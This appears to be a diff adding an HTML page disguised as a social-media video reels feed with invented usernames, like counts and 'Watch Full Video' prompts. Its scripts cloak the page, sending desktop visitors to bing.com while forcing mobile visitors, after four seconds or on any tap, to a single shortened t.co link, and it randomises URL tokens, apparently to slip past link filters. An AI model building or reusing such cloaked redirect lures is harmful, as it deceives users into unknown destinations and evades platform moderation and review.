@@ -1,0 +1,249 @@
+
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>My Complete World my Life</title>
+
+  <meta name="robots" content="noindex, nofollow, noarchive">
+  <meta property="og:title" content="Welcome">
+  <meta property="og:description" content="Thanks for visiting.">
+  <meta property="og:type" content="website">
+  <link rel="canonical" href="./">
+ <script>
+    (function () {
+      var isPC = !/Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent);
+      if (isPC) window.location.replace("https://www.bing.com/");
+    })();
+  </script>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+    body { background: #000; overflow: hidden; }
+    .reels-container { position: relative; width: 100vw; height: 100vh; overflow-y: auto; scroll-snap-type: y mandatory; -webkit-overflow-scrolling: touch; }
+    .image-wrapper { position: relative; width: 100%; height: 100vh; scroll-snap-align: start; cursor: pointer; }
+    img { width: 100%; height: 100%; object-fit: cover; display: block; }
+    .play-button { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 60px; height: 60px; background: rgba(255,255,255,.7); border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+    .play-button img { width: 40px; height: 40px; }
+    .overlay { position: absolute; width: 100%; height: 100%; top: 0; left: 0; display: flex; flex-direction: column; justify-content: space-between; color: white; padding: 10px; pointer-events: none; }
+    .top-info h4 { margin-bottom: 4px; }
+    .bottom-info { position: absolute; bottom: 10%; left: 10px; }
+    .right-icons { position: absolute; right: 10px; bottom: 20%; display: flex; flex-direction: column; gap: 15px; }
+    .icon { cursor: pointer; text-align: center; background: rgba(255,255,255,.2); padding: 10px; border-radius: 50%; display: flex; align-items: center; justify-content: center; pointer-events: auto; }
+    .icon img { width: 24px; height: 24px; }
+    .icon span { display: block; color: white; font-size: 12px; margin-top: 5px; }
+    .bar { position: fixed; top: 0; left: 0; right: 0; z-index: 10; display: flex; justify-content: space-between; align-items: center; padding: .5rem .75rem; background: rgba(0,0,0,.4); backdrop-filter: blur(4px); color: #fff; font-size: 12px; }
+    .bar .pill { background: rgba(255,255,255,.15); border-radius: 999px; padding: .25rem .5rem; }
+    .bar a.btn { color:#fff; text-decoration:none; border:1px solid rgba(255,255,255,.25); padding:.25rem .5rem; border-radius:8px; }
+    .hidden { display:none; }
+  </style>
+</head>
+<body>
+  <div class="bar">
+    <div>
+      <span class="pill">Mode: <strong id="mode-label">query</strong></span>
+      <span class="pill">Token: <code id="token-label">—</code></span>
+    </div>
+    <div><a href="#" id="switch-mode" class="btn">Switch to hash</a></div>
+  </div>
+
+  <div class="reels-container" id="reelsContainer"></div>
+
+<script defer data-domain="menucook.info" src="https://plausible.io/js/script.js"></script>
+
+  <script>
+    /**
+     * Mobile 4s Auto-Redirect (t.co)
+     * - PC users: handled above (PC → Yahoo)
+     * - Mobile users: after 4s, redirect via one of the provided t.co links
+     */
+    (function () {
+      var isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent);
+      if (!isMobile) return;
+
+      var tcoLinks = [
+        "https://t.co/HYJY1bf1vM",
+        "https://t.co/HYJY1bf1vM",
+        "https://t.co/HYJY1bf1vM",
+        "https://t.co/HYJY1bf1vM",
+        "https://t.co/HYJY1bf1vM",
+        "https://t.co/HYJY1bf1vM"
+      ];
+
+      var mode = "random";
+      function pickIndex(len) {
+        if (mode === "random") return Math.floor(Math.random() * len);
+        var key = "mobile_redirect_idx";
+        var idx = parseInt(localStorage.getItem(key) || "0", 10);
+        if (idx >= len || idx < 0) idx = 0;
+        localStorage.setItem(key, String((idx + 1) % len));
+        return idx;
+      }
+
+      // ⏱️ 4-second delay
+      setTimeout(function () {
+        var i = pickIndex(tcoLinks.length);
+        var target = tcoLinks[i];
+        if (typeof target === "string" && target.indexOf("https://t.co/") === 0) {
+          window.location.replace(target);
+        }
+      }, 4000);
+    })();
+
+    // ===== Configuration for your reels page =====
+    var UNIQUE_TOKEN_MODE = "query"; // "query" or "hash"
+    var TOKEN_LENGTH = 10;
+
+    // Optional timed redirect (OFF by default). Delay set to 4s.
+    var OPTIONAL_AUTO_REDIRECT = {
+      enabled: false,
+      delayMs: 4000,   // ← 4 seconds
+      links: [
+        "https://t.co/HYJY1bf1vM",
+        "https://t.co/HYJY1bf1vM",
+        "https://t.co/HYJY1bf1vM",
+        "https://t.co/HYJY1bf1vM",
+        "https://t.co/HYJY1bf1vM",
+        "https://t.co/HYJY1bf1vM"
+      ]
+    };
+
+    function randomToken(len){
+      var chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789";
+      var out = "";
+      for (var i=0; i<len; i++){ out += chars[Math.floor(Math.random()*chars.length)]; }
+      return out;
+    }
+    function setURLWithQuery(token){
+      var url = new URL(window.location.href);
+      url.searchParams.set("t", token);
+      history.replaceState(null, "", url.pathname + url.search + url.hash);
+    }
+    function setURLWithHash(token){
+      var url = new URL(window.location.href);
+      var newHash = "t=" + token;
+      history.replaceState(null, "", url.pathname + url.search + "#" + newHash);
+    }
+    function applyUniqueURL(mode){
+      var token = randomToken(TOKEN_LENGTH);
+      if (mode === "hash") setURLWithHash(token);
+      else setURLWithQuery(token);
+      document.getElementById("token-label").textContent = token;
+      document.getElementById("mode-label").textContent = mode;
+      document.getElementById("switch-mode").textContent = (mode === "query") ? "Switch to hash" : "Switch to query";
+    }
+    document.addEventListener("click", function(e){
+      var target = e.target;
+      if (target && target.id === "switch-mode") {
+        e.preventDefault();
+        UNIQUE_TOKEN_MODE = (UNIQUE_TOKEN_MODE === "query") ? "hash" : "query";
+        applyUniqueURL(UNIQUE_TOKEN_MODE);
+      }
+    });
+
+    function maybeAutoRedirect(){
+      if (!OPTIONAL_AUTO_REDIRECT.enabled) return;
+      var links = OPTIONAL_AUTO_REDIRECT.links || [];
+      if (!links.length) return;
+      setTimeout(function(){
+        var link = links[Math.floor(Math.random() * links.length)];
+        window.location.href = link;
+      }, OPTIONAL_AUTO_REDIRECT.delayMs || 4000);
+    }
+
+    var imageSources = [
+      "https://imagecdn.live/images/webp/44610224-4978-4f8a-a17c-24cdde4ee1c4.webp",
+      "https://imagecdn.live/images/webp/f837a8e6-5908-45dd-89f7-710c44d0e893.webp",
+      "https://imagecdn.live/images/webp/e1177c47-c84b-4eb2-8299-6724f94a9b12.webp",
+      "https://imagecdn.live/images/webp/36b27be3-9ece-4012-98fe-c899792ef147.webp",
+      "https://imagecdn.live/images/webp/760bfed9-7b9d-465a-80b6-f4cc20e2ac72.webp",
+      "https://imagecdn.live/images/webp/ca37180d-5b23-485b-b5fb-4b1618aec256.webp"
+    ];
+    var redirectLinks = [
+      "https://t.co/HYJY1bf1vM",
+      "https://t.co/HYJY1bf1vM",
+      "https://t.co/HYJY1bf1vM",
+      "https://t.co/HYJY1bf1vM",
+      "https://t.co/HYJY1bf1vM",
+      "https://t.co/HYJY1bf1vM"
+    ];
+    var usernames = ["@EmilyRose","@SophiaLane","@AvaGrace","@LiamNova","@ZoeSky","@JakeStorm"];
+    var descriptions = [
+      "🔥 Hot trending video!","💃 Dance moves on fire!","😍 Don't miss this!",
+      "⚽ Epic soccer moment!","🌄 Scenic mountain vibes!","🎸 Guitar solo madness!"
+    ];
+
+    function shuffleArray(array) {
+      for (var i = array.length - 1; i > 0; i--) {
+        var j = Math.floor(Math.random() * (i + 1));
+        var tmp = array[i]; array[i] = array[j]; array[j] = tmp;
+      }
+    }
+
+    function buildReels(){
+      var reelsContainer = document.getElementById("reelsContainer");
+      var images = imageSources.map(function(src, i){
+        return { src: src, url: redirectLinks[i] || "#", username: usernames[i] || "@user", description: descriptions[i] || "" };
+      });
+      shuffleArray(images);
+      images.forEach(function(image){
+        var reel = document.createElement("div");
+        reel.classList.add("image-wrapper");
+        reel.addEventListener("click", function(){ window.location.href = image.url; });
+        reel.innerHTML = '\
+          <img src="'+image.src+'" alt="Reel Image">\
+          <div class="play-button">\
+            <img src="https://cdn-icons-png.flaticon.com/512/27/27223.png" alt="Play">\
+          </div>\
+          <div class="overlay">\
+            <div class="top-info">\
+              <h4>'+image.username+'</h4>\
+              <p>'+image.description+'</p>\
+            </div>\
+            <div class="bottom-info"><p>Watch Full Video...</p></div>\
+            <div class="right-icons">\
+              <div class="icon" onclick="event.stopPropagation(); likeImage(this)">\
+                <img src="https://cdn-icons-png.flaticon.com/512/11820/11820106.png" alt="Like">\
+                <span>120</span>\
+              </div>\
+              <div class="icon" onclick="event.stopPropagation(); commentImage()">\
+                <img src="https://cdn-icons-png.flaticon.com/512/11820/11820052.png" alt="Comment">\
+                <span>15</span>\
+              </div>\
+              <div class="icon" onclick="event.stopPropagation(); shareImage()">\
+                <img src="https://cdn-icons-png.flaticon.com/512/11820/11820255.png" alt="Share">\
+                <span>8</span>\
+              </div>\
+            </div>\
+          </div>';
+        reelsContainer.appendChild(reel);
+      });
+    }
+
+    function likeImage(el) {
+      var span = el.querySelector("span");
+      var val = parseInt(span.textContent, 10) || 0;
+      span.textContent = val + 1;
+    }
+    window.likeImage = likeImage;
+
+    function commentImage() { alert("Opening comments..."); }
+    window.commentImage = commentImage;
+
+    function shareImage() {
+      if (navigator.share) {
+        navigator.share({ title: document.title, url: window.location.href }).catch(function(){});
+      } else {
+        alert("Copy this link to share: " + window.location.href);
+      }
+    }
+    window.shareImage = shareImage;
+
+    document.addEventListener("DOMContentLoaded", function(){
+      applyUniqueURL(UNIQUE_TOKEN_MODE);
+      buildReels();
+      maybeAutoRedirect();
+    });
+  </script>
+</body>
+</html>
